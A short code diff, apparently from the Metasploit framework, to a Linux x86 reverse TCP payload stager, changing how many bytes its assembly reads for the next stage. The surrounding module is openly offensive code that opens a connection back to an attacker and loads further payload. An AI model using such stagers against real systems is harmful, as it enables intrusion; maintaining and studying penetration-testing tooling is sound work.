@@ -89,6 +89,13 @@ module Payload::Linux::ReverseTcp_x86
     sleep_seconds = seconds.to_i
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
+    if respond_to?(:generate_intermediate_stage)
+      pay_mod = framework.payloads.create(self.refname)
+      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+    else
+      read_length = 4096
+    end
+
     asm = %Q^
         push #{retry_count}        ; retry counter
         pop esi
@@ -156,6 +163,7 @@ module Payload::Linux::ReverseTcp_x86
         mov ecx, esp
         cdq
         mov dh, 0xc
+        push   0x#{read_length.to_s(16)}
         mov al, 0x3
         int 0x80                  ; sys_read (recv())
         test eax, eax
